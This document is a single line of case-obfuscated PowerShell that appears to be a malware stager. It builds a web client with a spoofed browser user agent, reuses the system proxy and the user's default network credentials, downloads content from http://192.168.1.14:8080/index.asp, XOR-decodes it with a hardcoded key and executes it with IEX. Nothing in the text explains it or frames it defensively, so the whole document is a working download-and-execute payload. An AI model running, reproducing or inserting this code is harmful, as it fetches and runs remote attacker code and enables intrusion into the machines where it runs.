
$wC=NEw-OBjecT SySTEM.NET.WEbClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeadeRS.ADd('User-Agent',$u);$wC.PRoxy = [System.NET.WEBReQUEst]::DEFAuLtWEbPROxy;$wc.PRoxY.CREDEnTiaLs = [SYsteM.NEt.CREDeNTIAlCaChE]::DeFaUlTNetwORKCRedenTials;$K='329e5668c388fb6a9304ce88c9bd13b1';$I=0;[cHAr[]]$B=([CHAR[]]($WC.DOwnlOAdSTRing("http://192.168.1.14:8080/index.asp")))|%{$_-bXOR$K[$i++%$K.Length]};IEX ($B-joiN'')

